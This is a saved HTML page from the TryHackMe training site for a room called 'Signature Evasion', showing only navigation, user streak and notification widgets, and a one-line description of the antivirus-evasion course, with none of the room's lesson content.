<a class="dropdown-item hidden-originally" href="https://tryhackme.com/develop-rooms" data-pf_style_display="none" data-pf_style_visibility="hidden">Develop Rooms</a>
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/business" data-pf_style_display="none" data-pf_style_visibility="hidden">For Business</a>
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/classrooms" data-pf_style_display="none" data-pf_style_visibility="hidden">For Education</a>
<a class="dropdown-item hidden-originally" target="_blank" href="https://store.tryhackme.com/" data-pf_style_display="none" data-pf_style_visibility="hidden">Swag Shop</a>
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/glossary" data-pf_style_display="none" data-pf_style_visibility="hidden">Glossary</a>
</div>
</li>
</ul>
<ul class="navbar-nav navbar-right options vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
<li class="nav-item" data-toggle="modal" data-target="#navConnModal" data-pf_style_display="list-item" data-pf_style_visibility="visible">
<div id="thm-connection-status" class="thm-disconnected" style="display: flex;" data-pf_style_display="flex" data-pf_style_visibility="visible">
<div id="thm-connection-status-dot" class="dot-small" data-pf_style_display="block" data-pf_style_visibility="visible"></div> <span id="thm-connection-status-txt" class="ml-2 size-18 text-white" data-pf_style_display="block" data-pf_style_visibility="visible">Access Machines</span>
</div>
</li>
<li class="nav-item" data-pf_style_display="list-item" data-pf_style_visibility="visible">
<div class="nav-item-streak" data-pf_style_display="block" data-pf_style_visibility="visible">
<span id="streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;

&lt;div class=&#39;size-12 faded&#39;&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Access to networks, Streak freeze&lt;/p&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Streak freeze&lt;/p&gt;
  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
&lt;/div&gt;
 &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="" data-pf_style_display="inline" data-pf_style_visibility="visible">
<span id="user-streak" data-streak="7" class="hacker-green" data-pf_style_display="inline" data-pf_style_visibility="visible">7 <i class="fas fa-fire-alt" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
</span>

<script data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            let usersStreak = { // Global variable, used in rooms logic
                                streakFirstAnswered: new Date('Mon Jul 10 2023 03:13:45 GMT+0100 (British Summer Time)'),
                                streakLastAnswered: new Date('Sun Jul 16 2023 17:19:58 GMT+0100 (British Summer Time)'),
                                usersTimezone: 'Asia/Kolkata',
                                streakFreeze: 1
                            };
                            setSidebarStreaks(usersStreak.streakFirstAnswered, usersStreak.streakLastAnswered, usersStreak.usersTimezone, usersStreak.streakFreeze)
                        </script>
</div>
</li>
<li class="nav-item dropdown" id="notification-navitem" data-pf_style_display="list-item" data-pf_style_visibility="visible">
<a class="nav-link vertical-align-custom size-22 pl-0" href="https://tryhackme.com/room/signatureevasion#" id="notification-btn" role="button" data-toggle="dropdown" data-pf_style_display="flex" data-pf_style_visibility="visible">
<i id="notification-icon" class="fal fa-bell" data-pf_style_display="block" data-pf_style_visibility="visible"></i>
<div id="notification-dot" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></div>
</a>
<div id="nav-notification" class="dropdown-menu dropdown-menu-right hidden-originally" data-pf_style_display="none" data-pf_style_visibility="visible">
<div id="notification-header" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Notifications</div>
<div id="nav-notifications" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally" style="padding: 0px;">
    <div class="row notification hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
      <div class="col-auto text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><img height="18" src="./TryHackMe _ Signature Evasion_files/confetti.png" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></div>
      <div class="col p-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
        <div data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Congratulations, you leveled up! You're now level 10.</div>
        <div class="size-12 faded mt-1 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">27th Jun 2023</div>
      </div>
    </div>
  
    <div class="row notification hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
      <div class="col-auto text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fad fa-info-square small text-blue size-14 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></div>
      <div class="col p-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
        <div data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">A King of the Hill game you're in starts soon.  
        <a href="https://tryhackme.com/games/koth/75612" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Get ready</a>!</div>
        <div class="size-12 faded mt-1 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">22nd Jun 2023</div>
      </div>
    </div>
  
    <div class="row notification hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
      <div class="col-auto text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><img height="18" src="./TryHackMe _ Signature Evasion_files/confetti.png" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></div>
      <div class="col p-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
        <div data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Congratulations, you leveled up! You're now level 9.</div>
        <div class="size-12 faded mt-1 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">17th Jun 2023</div>
      </div>
    </div>
  </div>
</div>
</li>
<li class="nav-item dropdown" data-pf_style_display="list-item" data-pf_style_visibility="visible">
<a class="nav-link dropdown-toggle remove-arrow p-0" href="https://tryhackme.com/room/signatureevasion#" id="navbarAvatarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-pf_style_display="block" data-pf_style_visibility="visible">
<img src="./TryHackMe _ Signature Evasion_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="56" data-pf_rect_height="56">
</a>
<div class="dropdown-menu dropdown-menu-right hidden-originally" aria-labelledby="navbarAvatarDropdown" data-pf_style_display="none" data-pf_style_visibility="visible">
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/profile" data-pf_style_display="none" data-pf_style_visibility="hidden">Profile</a>
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/referrals" data-pf_style_display="none" data-pf_style_visibility="hidden">Refer a friend</a>
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/badges" data-pf_style_display="none" data-pf_style_visibility="hidden">Badges</a>
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/rooms" data-pf_style_display="none" data-pf_style_visibility="hidden">My Rooms</a>
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/access" data-pf_style_display="none" data-pf_style_visibility="hidden">Access</a>
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/feedback" data-pf_style_display="none" data-pf_style_visibility="hidden">Give Feedback</a>
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/logout" data-pf_style_display="none" data-pf_style_visibility="hidden">Logout</a>
</div>
</li>
</ul>
</div>
</div>
</nav>
<link rel="stylesheet" href="./TryHackMe _ Signature Evasion_files/streak-freeze.css" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
<div class="modal fade modal-streak-freeze hidden-originally" id="unlocked-streak-freeze" role="dialog" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<button type="button" class="close close-streak hidden-originally" id="close-streak-freeze-popup" data-dismiss="modal" aria-label="Close" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Ã—</span>
</button>
<div class="modal-body hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<figure data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<img class="img-streak hidden-originally" width="400px" alt="streak freeze unlocked" src="./TryHackMe _ Signature Evasion_files/streak-freeze.svg" data-pf_style_display="none" data-pf_style_visibility="hidden">
</figure>
<h2 data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">You've unlocked a streak freeze!</h2>
<p data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">With these one-time streak freezes, you can miss one day of hacking without losing your streak.</p>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Signature Evasion_files/streak-freeze.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<nav id="thm-mobile-nav-menu" class="thm-mobile-nav hidden-originally" aria-label="Mobile secondary navigation menu." data-pf_style_display="none" data-pf_style_visibility="visible">
<header data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<a href="https://tryhackme.com/" aria-label="Go to the home page" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<img width="140" src="./TryHackMe _ Signature Evasion_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
</a>
<button id="thm-mobile-nav-close" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Close mobile navigation" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<i class="fal fa-times hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</button>
</header>
<ul class="thm-mobile-nav-items mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<li class="nav-item hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link hidden-originally" href="https://tryhackme.com/dashboard" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="nav-title-icon far fa-browser hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
<div class="nav-title hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Dashboard</div>
</a>
</li>
<li class="nav-item active hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link hidden-originally" href="https://tryhackme.com/hacktivities" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="nav-title-icon far fa-book-open hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
<div class="nav-title hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Learn</div>
</a>
</li>
<li class="nav-item hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a aria-expanded="false" aria-controls="mobile-nav-compete" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-compete" class="sublinks-toggle nav-link hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="nav-title-icon far fa-trophy hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
<div class="nav-title hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Compete</div>
<i class="far fa-angle-down hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</a>
<div id="mobile-nav-compete" class="dropdown-wrapper hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a href="https://tryhackme.com/leaderboards" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<i class="fas fa-trophy hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</div>
<div data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<span class="mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Leaderboards</span>
<div class="text-lgray size-12 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Platform Rankings</div>
</div>
</a>
<a href="https://tryhackme.com/games/koth" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<i class="fas fa-crown hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</div>
<div data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<span class="mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">King of the Hill</span>
<div class="text-lgray size-12 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Attack &amp; Defend</div>
</div>
</a>
<a href="https://tryhackme.com/workspace" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<i class="fas fa-user-friends hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</div>
<div data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<span class="mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Workspace</span>
<div class="text-lgray size-12 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a aria-expanded="false" aria-controls="mobile-nav-other" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-other" class="sublinks-toggle nav-link hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="nav-title-icon far fa-ellipsis-h-alt hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
<div class="nav-title hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Other</div>
<i class="far fa-angle-down hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</a>
<div id="mobile-nav-other" class="dropdown-wrapper hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a href="https://tryhackme.com/resources" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Resources</a>
<a href="https://tryhackme.com/subscriptions" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Buy Vouchers</a>
<a href="https://tryhackme.com/develop-rooms" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Develop Rooms</a>
<a href="https://tryhackme.com/business" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">For Business</a>
<a href="https://tryhackme.com/classrooms" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">For Education</a>
<a target="_blank" href="https://store.tryhackme.com/" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Swag Shop</a>
</div>
</li>
<li class="nav-item text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="nav-item-streak hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span id="mobile-streak-popover" class="size-24 hidden-originally" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;

&lt;div class=&#39;size-12 faded&#39;&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Access to networks, Streak freeze&lt;/p&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Streak freeze&lt;/p&gt;
  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
&lt;/div&gt;
 &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span id="mobile-user-streak" data-streak="7" class="hacker-green hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">7 <i class="fas fa-fire-alt hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></span>
</span>
</div>
</li>
<li class="nav-item text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link size-22 d-inline-block hidden-originally" href="https://tryhackme.com/room/signatureevasion#" id="mobile-notification-btn" role="button" data-toggle="dropdown" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i id="mobile-notification-icon" class="fal fa-bell hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
<div id="mobile-notification-dot" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></div>
</a>
<div id="mobile-nav-notification" class="dropdown-menu dropdown-menu-right hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div id="mobile-notification-header" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Notifications</div>
<div id="mobile-nav-notifications" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally" style="padding: 0px;">
    <div class="row notification hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
      <div class="col-auto text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><img height="18" src="./TryHackMe _ Signature Evasion_files/confetti.png" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></div>
      <div class="col p-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
        <div data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Congratulations, you leveled up! You're now level 10.</div>
        <div class="size-12 faded mt-1 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">27th Jun 2023</div>
      </div>
    </div>
  
    <div class="row notification hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
      <div class="col-auto text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fad fa-info-square small text-blue size-14 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></div>
      <div class="col p-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
        <div data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">A King of the Hill game you're in starts soon.  
        <a href="https://tryhackme.com/games/koth/75612" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Get ready</a>!</div>
        <div class="size-12 faded mt-1 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">22nd Jun 2023</div>
      </div>
    </div>
  
    <div class="row notification hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
      <div class="col-auto text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><img height="18" src="./TryHackMe _ Signature Evasion_files/confetti.png" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></div>
      <div class="col p-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
        <div data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Congratulations, you leveled up! You're now level 9.</div>
        <div class="size-12 faded mt-1 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">17th Jun 2023</div>
      </div>
    </div>
  </div>
</div>
</li>
<li class="nav-item text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a aria-expanded="false" aria-controls="mobile-nav-auth" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-auth" class="sublinks-toggle nav-link d-inline-block hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<img src="./TryHackMe _ Signature Evasion_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
</a>
<div id="mobile-nav-auth" class="dropdown-wrapper hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a href="https://tryhackme.com/profile" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Profile</a>
<a href="https://tryhackme.com/referrals" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Refer a friend</a>
<a href="https://tryhackme.com/badges" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Badges</a>
<a href="https://tryhackme.com/rooms" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">My Rooms</a>
<a href="https://tryhackme.com/access" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Access</a>
<a href="https://tryhackme.com/feedback" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Give Feedback</a>
<a href="https://tryhackme.com/logout" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Logout</a>
</div>
</li>
</ul>
</nav>
<script defer="" src="./TryHackMe _ Signature Evasion_files/mobile-nav.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
  const userSignedUpLessThanSevenDaysAgo = Math.floor(
    (new Date() - new Date('Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)')) / (1000 * 60 * 60 * 24) < 7
  );

  const userHasFirst4RoomsBadge = !!``;
  const isBeginner = `advanced` === 'complete-beginner';
</script>
<script src="./TryHackMe _ Signature Evasion_files/notifications.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/streak-freeze(1).js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<div id="wrapper" data-pf_style_display="block" data-pf_style_visibility="visible">
<div id="room-banner" class="shadow-light" data-pf_style_display="block" data-pf_style_visibility="visible">
<img id="room-image-large" src="./TryHackMe _ Signature Evasion_files/461db271e310812a73d4a96abd2dc9eb.png" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="1912" data-pf_rect_height="230" class="pf-large-image">
<div data-pf_style_display="block" data-pf_style_visibility="visible">
<div id="room-details" data-pf_style_display="block" data-pf_style_visibility="visible">
<div class="container" data-pf_style_display="block" data-pf_style_visibility="visible">
<div class="page-header" data-pf_style_display="block" data-pf_style_visibility="visible">
<div class="room-header" data-pf_style_display="grid" data-pf_style_visibility="visible">
<div id="room-voting" class="text-center vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
<div class="voting-buttons" data-pf_style_display="block" data-pf_style_visibility="visible">
<i class="fas fa-thumbs-up display-block" onclick="makeVote(true)" id="vote-up" style="color: rgb(185, 185, 185);" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i>
<div class="display-block" id="vote-number" data-pf_style_display="block" data-pf_style_visibility="visible">96</div>
<i class="fas fa-thumbs-down display-block" onclick="makeVote(false)" id="vote-down" style="color: rgb(185, 185, 185);" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i>
</div>
</div>
<div id="room-logo" class="vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
<div id="logo" data-pf_style_display="block" data-pf_style_visibility="visible"><img class="room-avatar" src="./TryHackMe _ Signature Evasion_files/c729b68475952db950aaaa2b2beeea22.png" onerror="replaceImg(this)" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="90" data-pf_rect_height="90"></div>
</div>
<div class="vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
<div id="room-basic-data" data-pf_style_display="block" data-pf_style_visibility="visible">
<div class="d-flex justify-content-between" data-pf_style_display="flex" data-pf_style_visibility="visible">
<h1 id="title" class="bold-head" data-pf_style_display="block" data-pf_style_visibility="visible">Signature Evasion</h1>
<div id="room-title-options" data-pf_style_display="block" data-pf_style_visibility="visible">

<div class="btn-group" id="browser-machine-options" role="group" aria-label="Start AttackBox or Kali Linux" style="display: inline-flex;" data-pf_style_display="inline-flex" data-pf_style_visibility="visible">
<button id="browser-machine-start" type="button" class="btn btn-secondary" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="far fa-laptop" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Start AttackBox</button>
<div class="btn-group" id="browser-machines" role="group" data-pf_style_display="flex" data-pf_style_visibility="visible">
<button id="btnGroupDrop1" type="button" class="btn btn-secondary dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-pf_style_display="block" data-pf_style_visibility="visible"></button>
<div class="dropdown-menu hidden-originally" aria-labelledby="btnGroupDrop1" data-pf_style_display="none" data-pf_style_visibility="visible">
<a class="dropdown-item preventDefault hidden-originally" href="https://tryhackme.com/room/signatureevasion#" onclick="changeMyMachine(&quot;kali-linux&quot;)" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span class="mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Use Kali Linux</span>
<div class="text-lgray size-12 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Web-based Kali Machine</div>
</a>
<a class="dropdown-item preventDefault hidden-originally" href="https://tryhackme.com/room/signatureevasion#" onclick="changeMyMachine(&quot;attackbox&quot;)" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span class="mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Use AttackBox</span>
<div class="text-lgray size-12 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Recommended</div>
</a>
</div>
</div>
</div>
<button id="browser-machine-split-view" type="button" class="btn btn-secondary hidden-originally" data-pf_style_display="none" data-pf_style_visibility="visible">Show Split View</button>
<button id="cloud-details" type="button" class="btn btn-info hidden-originally" data-pf_style_display="none" data-pf_style_visibility="visible"><i class="far fa-clouds mr-1 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>Cloud Details</button>
<span id="awards-model-btn" data-toggle="modal" data-target="#award-modal" class="badge badge-warning ml-1 noselect hidden-originally" data-pf_style_display="none" data-pf_style_visibility="visible">Awards</span>
<span id="room-faq-slideout" type="button" class="badge badge-info ml-1 noselect d-inline-flex" onclick="openHelpMenu()" data-pf_style_display="inline-flex" data-pf_style_visibility="visible">
Help
</span>
<div class="dropright room-dropright noselect ml-1" id="room-options" style="display: inline-block;" data-pf_style_display="inline-block" data-pf_style_visibility="visible">
<span class="badge badge-secondary" data-toggle="dropdown" data-pf_style_display="flex" data-pf_style_visibility="visible">
<i class="fas fa-cog" data-pf_style_display="block" data-pf_style_visibility="visible"></i>
</span>
<div class="dropdown-menu hidden-originally" data-pf_style_display="none" data-pf_style_visibility="visible">
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/api/room/manage/clone/signatureevasion" id="clone-room" style="display: none;" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="far fa-clone faded hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Clone Room</a>
<a class="dropdown-item preventDefault hidden-originally" id="writeups-simple" style="display: inline-block;" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-pen-alt faded hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Writeups</a>
<a class="dropdown-item preventDefault hidden-originally" data-toggle="modal" data-target="#resetUserProgressModal" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-eraser faded hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Reset Progress</a>
<a class="dropdown-item preventDefault hidden-originally" id="leave-room" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-sign-out-alt faded hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Leave</a>
</div>
</div>
<span id="bookmark" class="badge badge-secondary badge-bookmark " data-pf_style_display="inline-block" data-pf_style_visibility="visible">
<img class="bookmark" src="./TryHackMe _ Signature Evasion_files/bookmark.svg" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="16" data-pf_rect_height="20">
<span class="bookmark-popover" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="top" data-content="&lt;p class=&#39;mb-0&#39;&gt;Save room &lt;/p&gt;
" data-original-title="" title="" data-pf_style_display="block" data-pf_style_visibility="visible">
</span>
</span>
</div>
</div>
<p class="mb0 faded" id="description" data-pf_style_display="block" data-pf_style_visibility="visible">Learn how to break signatures and evade common AV, using modern tool-agnostic approaches.</p>
</div>
</div>
</div>
</div>

</div>
</div>
<div id="room-banner-stats" data-pf_style_display="block" data-pf_style_visibility="visible">
<div class="creators" data-pf_style_display="block" data-pf_style_visibility="visible"></div>
<div class="numbers" data-pf_style_display="block" data-pf_style_visibility="visible"></div>
</div>
</div>
</div>
<div class="container main pb" data-pf_style_display="block" data-pf_style_visibility="visible">
<div id="room-message" data-pf_style_display="block" data-pf_style_visibility="visible"></div>
